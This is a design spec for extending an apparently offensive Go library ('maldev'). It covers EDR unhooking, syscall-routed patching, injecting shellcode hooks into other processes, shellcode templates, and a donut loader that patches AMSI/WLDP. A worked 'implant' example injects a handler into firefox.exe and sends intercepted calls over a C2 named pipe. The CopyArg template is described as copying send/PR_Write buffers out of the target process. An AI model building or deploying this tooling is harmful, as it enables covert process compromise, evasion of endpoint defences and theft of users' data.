# Hook Extensions — Design Spec

## Goal

Extend `evasion/hook` with PE import analysis, probe hooking, multi-hook groups, EDR-aware installation, cross-process hooking via `inject/`, and a library of pre-fabricated shellcodes for remote hook handlers.

## Scope

7 deliverables across 2 packages:

1. **`pe/imports`** — PE import analysis (cross-platform)
2. **`evasion/hook` HookOption + WithCaller/WithCleanFirst** — options pattern for local hooks
3. **`evasion/hook` InstallProbe/InstallProbeByName** — max-params heuristic hook
4. **`evasion/hook` HookGroup + InstallAll** — multi-hook management
5. **`evasion/hook` RemoteInstall/RemoteInstallByName** — cross-process via inject
6. **`evasion/hook/shellcode`** — pre-fabricated shellcode templates
7. **Documentation + tests**

## Package 1: `pe/imports`

### Purpose

Cross-platform PE import table parser. Returns structured import data from any PE file.

### API

```go
package imports

type Import struct {
    DLL      string
    Function string
    Ordinal  uint16 // 0 if imported by name
}

// List returns all imports from a PE file.
func List(pePath string) ([]Import, error)

// ListByDLL returns imports from a specific DLL only.
func ListByDLL(pePath, dllName string) ([]Import, error)

// FromReader parses imports from an io.ReaderAt (for in-memory PEs).
func FromReader(r io.ReaderAt) ([]Import, error)
```

### Implementation

Uses `debug/pe` stdlib. `List` opens the PE, calls `f.ImportedSymbols()`, parses the `dll:name` format into structured `Import` values. `ListByDLL` filters. `FromReader` wraps `pe.NewFile(r)`.

### Dependencies

None (stdlib only).

## Package 2: `evasion/hook` — Options Pattern

### Current API (to modify)

```go
// Current — no options
func Install(targetAddr uintptr, handler interface{}) (*Hook, error)
func InstallByName(dll, fn string, handler interface{}) (*Hook, error)
```

### New API

```go
type HookOption func(*hookConfig)

type hookConfig struct {
    caller     *wsyscall.Caller
    cleanFirst bool
}

func Install(targetAddr uintptr, handler interface{}, opts ...HookOption) (*Hook, error)
func InstallByName(dll, fn string, handler interface{}, opts ...HookOption) (*Hook, error)

// WithCaller routes memory patching through direct/indirect syscalls.
func WithCaller(c *wsyscall.Caller) HookOption

// WithCleanFirst unhooks EDR hooks on the target function before installing ours.
// Uses unhook.ClassicUnhook internally.
func WithCleanFirst() HookOption
```

### Breaking change

`Install` and `InstallByName` gain a variadic `...HookOption` parameter. Existing callers without options compile unchanged.

### WithCleanFirst implementation

```go
if cfg.cleanFirst {
    unhook.ClassicUnhook(funcName, cfg.caller)
}
// then proceed with normal hook installation
```

Requires importing `evasion/unhook`. Check for import cycle — `unhook` does not import `hook`, so this is safe.

### WithCaller implementation

Replace `api.PatchMemory(addr, patch)` with `api.PatchMemoryWithCaller(addr, patch, cfg.caller)` when caller is non-nil.

## Package 3: InstallProbe

### Purpose

Hook a function with 18 uintptr parameters when the signature is unknown. Reports which params appear used (non-zero heuristic).

### API

```go
type ProbeResult struct {
    Args [18]uintptr
    Ret  uintptr
}

// NonZeroArgs returns the indices of non-zero arguments.
func (r ProbeResult) NonZeroArgs() []int

// NonZeroCount returns how many arguments are non-zero.
func (r ProbeResult) NonZeroCount() int

func InstallProbe(targetAddr uintptr, onCall func(ProbeResult), opts ...HookOption) (*Hook, error)
func InstallProbeByName(dll, fn string, onCall func(ProbeResult), opts ...HookOption) (*Hook, error)
```

### Implementation

Internally creates a handler with 18 uintptr params. The handler populates a `ProbeResult`, calls `onCall`, then forwards all 18 args to the trampoline:

```go
handler := func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18 uintptr) uintptr {
    result := ProbeResult{Args: [18]uintptr{a1, a2, ...}}
    onCall(result)
    r, _, _ := syscall.SyscallN(h.Trampoline(), a1, a2, ..., a18)
    result.Ret = r
    return r
}
```

### Limitation (documented)

Heuristic only. A real parameter with value 0 is indistinguishable from an unused slot.

## Package 4: HookGroup

### API

```go
type Target struct {
    DLL     string
    Func    string
    Handler interface{}
}

type HookGroup struct {
    hooks []*Hook
    mu    sync.Mutex
}

// InstallAll hooks multiple functions. If any hook fails, all previously
// installed hooks are removed and the error is returned.
func InstallAll(targets []Target, opts ...HookOption) (*HookGroup, error)

// RemoveAll unhooks all functions in the group.
func (g *HookGroup) RemoveAll() error

// Hooks returns all individual hooks for inspection.
func (g *HookGroup) Hooks() []*Hook
```

### Rollback semantics

If the 3rd hook fails, hooks 1 and 2 are `Remove()`d before returning the error. All-or-nothing.

## Package 5: RemoteInstall

### Purpose

Install an inline hook in another process by generating a hook-setup shellcode and injecting it via `inject/`.

### API

```go
type RemoteOption func(*remoteConfig)

type remoteConfig struct {
    method inject.Method
    caller *wsyscall.Caller
}

func WithMethod(m inject.Method) RemoteOption
func WithRemoteCaller(c *wsyscall.Caller) RemoteOption

// RemoteInstall hooks a function in another process.
// shellcodeHandler is the handler that will be called when the hooked function is invoked.
// It is injected alongside the relay/trampoline/patch setup code.
func RemoteInstall(pid uint32, dll, fn string, shellcodeHandler []byte, opts ...RemoteOption) error

// RemoteInstallByName resolves the process by name via enum.FindByName.
func RemoteInstallByName(processName, dll, fn string, shellcodeHandler []byte, opts ...RemoteOption) error
```

### Implementation

1. Open target process (PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD)
2. Resolve target function address — ntdll/kernel32 have same base across processes (ASLR per-boot). For other DLLs, enumerate loaded modules via `EnumProcessModules` + `GetModuleFileNameEx`, then parse exports to find the function RVA, add to module base.
3. Read the target's function prologue via `ReadProcessMemory`
4. Run `analyzePrologue` on the bytes to get stealLen + relocs
5. Allocate relay + trampoline in target process via `VirtualAllocEx`
6. Write relay, trampoline (with RIP fixups), and shellcode handler via `WriteProcessMemory`
7. Build the hook patch (JMP rel32 → relay) and write it
8. Flush instruction cache in target process
9. Optionally use `inject.Build()` to execute the shellcode handler setup if it needs initialization

### Module base resolution for non-system DLLs

```go
// For ntdll.dll, kernel32.dll — same address across all processes (ASLR per-boot)
// For other DLLs — enumerate via CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid)
```

## Package 6: `evasion/hook/shellcode`

### Purpose

Pre-fabricated shellcode templates for use as `shellcodeHandler` in `RemoteInstall`. Each is a small x64 shellcode with placeholders replaced at runtime.

### API

```go
package shellcode

// ShellcodeBlock returns a shellcode that returns 0 (blocks the API call).
func Block() []byte

// Nop returns a shellcode that calls the original function unchanged (monitoring point).
func Nop() []byte

// Replace returns a shellcode that returns a fixed value.
func Replace(returnValue uintptr) []byte

// Redirect returns a shellcode that JMPs to another address instead.
func Redirect(targetAddr uintptr) []byte

// LogToPipe returns a shellcode that writes the first N args to a named pipe
// then calls the original function.
func LogToPipe(pipeName string) []byte

// LogToFile returns a shellcode that appends args to a file then calls original.
func LogToFile(path string) []byte

// CopyArg returns a shellcode that copies the buffer pointed to by argIndex
// (up to maxLen bytes) to a named pipe, then calls original.
// Useful for intercepting send/PR_Write buffers.
func CopyArg(argIndex int, pipeName string, maxLen uint32) []byte

// BlockIf returns a shellcode that blocks (ret 0) if the buffer at argIndex
// contains pattern, otherwise calls original.
func BlockIf(argIndex int, pattern []byte) []byte

// Chain concatenates shellcodes to execute in sequence.
// Each shellcode except the last must end with a call to the next rather than ret.
func Chain(shellcodes ...[]byte) []byte
```

### Template mechanism

Each shellcode is a pre-assembled x64 byte sequence with sentinel placeholders:

```
0xDEADBEEF_DEADBEEF — 8 bytes, replaced with target address / return value
0xCAFEBABE_CAFEBABE — 8 bytes, replaced with trampoline address
0xFEEDFACE_FEEDFACE — 8 bytes, replaced with data pointer (pipe name, file path)
```

`bytes.Replace` swaps sentinels with real values. The shellcodes are position-independent (no absolute addresses except the patched sentinels).

### Static shellcodes (generated via avo, or hand-encoded)

`Block`, `Nop`, `Replace`, `Redirect` are tiny (5-20 bytes) and hand-encoded.

`LogToPipe`, `LogToFile`, `CopyArg`, `BlockIf` are larger (50-200 bytes) and need to call Win32 APIs (`CreateFileW`, `WriteFile`, `CloseHandle`). These resolve API addresses dynamically via PEB → LDR → InLoadOrderModuleList → export table walk (standard shellcode pattern, already used in `pe/srdi`).

### Chain

`Chain` patches each shellcode's epilogue to JMP to the next instead of RET. The last one RETs normally. This allows composing: `Chain(LogToPipe(pipe), Nop())` = log then forward.

## Package 7: Donut-Based Go Handler for Remote Hooks

### Purpose

Allow writing remote hook handlers as normal Go code (a DLL with an exported
entry point), converting them to shellcode via `pe/srdi` (go-donut), and
injecting them into the target process. The Go handler gets the hooked
function's arguments via a bridge mechanism.

### Flow

```
Parent Process                        Target Process
    │                                      │
    ├─ go build -buildmode=c-shared        │
    │  → handler.dll (exports HandlerEntry)│
    │                                      │
    ├─ srdi.ConvertDLL("handler.dll",      │
    │    &srdi.Config{Method:"HandlerEntry"})
    │  → handlerShellcode []byte           │
    │                                      │
    ├─ hook.RemoteInstall(pid, dll, fn,    │
    │    handlerShellcode,                 │
    │    hook.WithMethod(MethodCRT))  ────→│ Donut loader runs:
    │                                      │  1. Patches AMSI/WLDP
    │                                      │  2. Maps handler.dll
    │                                      │  3. Resolves imports
    │                                      │  4. Calls HandlerEntry
    │                                      │
    │  [Optional: named pipe for config]   │  Handler connects to pipe
    │  listener ◄──────────────────────────│  for args/results
    │                                      │
```

### Bridge Package: `evasion/hook/bridge`

The handler DLL imports `bridge` to read the hooked function's arguments.
The bridge works via shared memory: the relay stub saves RCX/RDX/R8/R9
into a known offset before jumping to the donut shellcode.

```go
package bridge

// ArgBlock is written by the relay stub at a known address in the target process.
// The relay saves the first 4 register args + stack args before jumping to the handler.
type ArgBlock struct {
    Args [18]uintptr
    TrampolineAddr uintptr
}

// ReadArgs reads the argument block saved by the relay stub.
// Must be called from within the hook handler running in the target process.
func ReadArgs() *ArgBlock

// CallOriginal calls the original function via the trampoline address
// stored in the ArgBlock.
func CallOriginal(args ...uintptr) uintptr
```

### Relay Stub Extension

The relay stub for donut-based handlers is extended (vs the simple 13-byte
absolute JMP for template shellcodes):

```asm
; Save register args to ArgBlock (allocated in target process)
mov [argblock+0x00], rcx
mov [argblock+0x08], rdx
mov [argblock+0x10], r8
mov [argblock+0x18], r9
; Save trampoline address
mov rax, <trampoline_addr>
mov [argblock+0x90], rax
; Jump to donut shellcode
mov r10, <donut_shellcode_addr>
jmp r10
```

~60 bytes, position-independent with sentinel placeholders.

### Helper: `hook.GoHandler`

Convenience function that does the full pipeline:

```go
// GoHandler converts a Go handler DLL to shellcode ready for RemoteInstall.
// The DLL must export the function named by entryPoint.
func GoHandler(dllPath string, entryPoint string) ([]byte, error) {
    cfg := &srdi.Config{
        Arch:   srdi.ArchX64,
        Type:   srdi.ModuleDLL,
        Method: entryPoint,
        Bypass: 3, // AMSI/WLDP continue on fail
    }
    return srdi.ConvertFile(dllPath, cfg)
}

// GoHandlerBytes does the same from in-memory DLL bytes.
func GoHandlerBytes(dllBytes []byte, entryPoint string) ([]byte, error) {
    cfg := &srdi.Config{
        Arch:   srdi.ArchX64,
        Type:   srdi.ModuleDLL,
        Method: entryPoint,
        Bypass: 3,
    }
    return srdi.ConvertBytes(dllBytes, cfg)
}
```

### Full Example

```go
// === Handler DLL (separate Go module, built as c-shared) ===
// handler/main.go
package main

import "C"
import (
    "github.com/oioio-space/maldev/evasion/hook/bridge"
    "github.com/oioio-space/maldev/c2/transport/namedpipe"
)

//export HandlerEntry
func HandlerEntry() {
    args := bridge.ReadArgs()
    // args.Args[0] = lpFileName (for DeleteFileW)
    
    // Report back to implant via named pipe
    p := namedpipe.New(`\\.\pipe\hookresults`, 5*time.Second)
    p.Connect(context.Background())
    fmt.Fprintf(p, "DeleteFileW called: %x\n", args.Args[0])
    p.Close()
    
    // Call original
    bridge.CallOriginal(args.Args[:]...)
}

func main() {}

// === Implant (injects the handler into Firefox) ===
// Build handler: go build -buildmode=c-shared -o handler.dll ./handler/
shellcode, _ := hook.GoHandler("handler.dll", "HandlerEntry")

hook.RemoteInstallByName("firefox.exe", "kernel32.dll", "DeleteFileW", shellcode,
    hook.WithMethod(inject.MethodCreateRemoteThread),
    hook.WithRemoteCaller(caller),
)

// Listen for results
listener, _ := namedpipe.NewListener(`\\.\pipe\hookresults`)
conn, _ := listener.Accept(ctx)
io.Copy(os.Stdout, conn) // prints intercepted calls
```

### Existing Infrastructure Used

| Component | Role |
|-----------|------|
| `pe/srdi` | Convert Go DLL → position-independent shellcode (go-donut) |
| `inject/` | Inject shellcode into target process (15+ methods) |
| `process/enum` | Resolve process name → PID |
| `c2/transport/namedpipe` | IPC between implant and handler |
| `evasion/hook` (relay/trampoline) | Install the hook in target process |

## Architecture

```
pe/imports/                     Layer 0 — pure PE analysis
    imports.go
    imports_test.go

evasion/hook/                   Layer 2 — hooking engine
    doc.go
    x86len.go                   instruction decoder (existing)
    hook_windows.go             Install/InstallByName + HookOption (modified)
    hook_stub.go                !windows stub (modified)
    probe_windows.go            InstallProbe/InstallProbeByName
    group_windows.go            HookGroup + InstallAll
    remote_windows.go           RemoteInstall/RemoteInstallByName + GoHandler
    hook_windows_test.go        (existing + new tests)

evasion/hook/bridge/            Layer 2 — cross-process arg bridge
    bridge_windows.go           ReadArgs, CallOriginal
    bridge_stub.go              !windows stub

evasion/hook/shellcode/         Layer 2 — shellcode templates
    shellcode.go                Block, Nop, Replace, Redirect
    pipe.go                     LogToPipe, CopyArg
    file.go                     LogToFile
    filter.go                   BlockIf
    chain.go                    Chain
    shellcode_test.go
```

### Dependency graph

```
pe/imports → debug/pe (stdlib)
evasion/hook → win/api, win/syscall, evasion/unhook (for WithCleanFirst)
evasion/hook → inject (for RemoteInstall)
evasion/hook → process/enum (for RemoteInstallByName)
evasion/hook → pe/srdi (for GoHandler)
evasion/hook/bridge → win/api (for ReadArgs/CallOriginal)
evasion/hook/shellcode → (no maldev deps, self-contained byte templates)
```

## Testing Strategy

- `pe/imports`: test against `notepad.exe` on Windows, skip on other platforms
- `Install` + options: existing GetTickCount tests + new WithCaller/WithCleanFirst tests
- `InstallProbe`: hook GetTickCount, verify NonZeroCount() >= 0 (no args)
- `HookGroup`: install 3 hooks, verify all called, RemoveAll restores all
- `RemoteInstall`: inject into spawned sacrificial process (notepad), verify hook patch in target memory via `ReadProcessMemory`. Use `testutil.SpawnAndResume`.
- `GoHandler`: build a minimal test DLL, convert via srdi, verify shellcode is non-empty
- `bridge`: unit test ArgBlock serialization/deserialization
- Shellcodes: unit test each template (verify correct byte sequences, placeholder replacement)
- **VM-only tests** (tagged `intrusive`): full end-to-end RemoteInstall into notepad with real hook verification

## Limitations (documented)

- `InstallProbe` is heuristic — 0-valued real params are invisible
- `RemoteInstall` template shellcode handler has no Go runtime — limited to raw Win32 calls
- `GoHandler` (donut-based) has full Go runtime but adds ~2MB to shellcode size
- `syscall.NewCallback` supports max ~18 uintptr params (local hooks only)
- `Chain` requires each shellcode to be position-independent
- Don't hook Go runtime critical functions (NtClose, NtCreateFile, NtReadFile, NtWriteFile)
- Cross-process hooking of non-system DLLs requires module enumeration to find base address
- `bridge.ReadArgs` relies on a fixed-offset shared memory layout — relay stub and bridge must agree on the ArgBlock address
